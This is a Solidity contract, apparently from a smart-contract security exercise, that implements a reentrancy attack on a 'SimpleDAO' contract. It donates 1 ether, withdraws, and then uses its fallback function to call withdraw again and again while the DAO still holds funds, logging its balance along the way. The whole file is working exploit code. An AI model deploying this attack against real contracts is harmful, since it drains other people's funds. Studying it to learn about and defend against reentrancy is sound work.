// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.15;

import "forge-std/console.sol";
import "./SimpleDao.sol";

contract SimpleDAOAttack {
    SimpleDAO dao;

    function attack(address daoAddress) external {
        console.log("balance before: ", address(this).balance);
        dao = SimpleDAO(daoAddress);

        dao.donate{value: 1 ether}(address(this));
        dao.withdraw(1 ether);
    }

    fallback() external payable {
        console.log("balance after:  ", address(this).balance);

        if (address(dao).balance >= 1 ether) {
            dao.withdraw(1 ether);
        }
    }

    // Added to get rid of linter warnings
    receive() external payable {}
}
